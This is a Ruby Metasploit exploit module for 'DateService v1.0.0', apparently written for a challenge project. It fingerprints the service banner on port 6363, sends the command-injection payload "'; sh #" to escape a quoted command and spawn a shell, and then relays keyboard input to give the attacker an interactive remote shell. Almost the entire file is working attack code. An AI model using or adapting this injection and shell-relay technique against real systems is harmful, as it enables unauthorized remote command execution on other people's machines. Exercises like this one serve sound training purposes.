require 'msf/core'
require 'socket'

class MetasploitModule < Msf::Exploit::Remote
  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'DateService v1.0.0 Command Injection RCE',
      'Description'    => %q{
        Exploits the CLI vulnerability in DateService version 1.0.0.
        Injects a plain sh shell and lets the attacker interact with it.
      },
      'Author'         => ['Sviatko124'],
      'License'        => MSF_LICENSE,
      'References'     => [
        ['URL', 'http://github.com/Sviatko124/metasploit-challenge-project']
      ],
      'Targets'        => [['Automatic', {}]],
      'DefaultTarget'  => 0,
      'DisclosureDate' => '2025-09-23'
    ))

    register_options([
      Opt::RPORT(6363)
    ])
  end

  def exploit
    print_status("Connecting to #{rhost}:#{rport}...")
    connect

    begin
      banner = sock.get_once(4096, 2)
      first_line = banner.split("\n")[0] if banner
      print_status("Received banner: #{first_line}") if first_line
      if first_line && first_line.include?("v1.0.0")
        print_good("Target is vulnerable!")
      else
        print_warning("Target is likely not vulnerable.")
      end
    rescue ::EOFError, ::IOError
    end

    sock.put("'; sh #\n")
    print_status("Payload sent!")

    loop do
      ready = IO.select([$stdin, sock])
      ready[0].each do |fd|
        if fd == $stdin
          input = $stdin.gets
          break unless input
          sock.put(input)
        elsif fd == sock
          data = sock.recv(4096)
          if data.empty?
            print_status("Connection closed by target.")
            break
          end
          print data
        end
      end
    end
    disconnect
  end
end
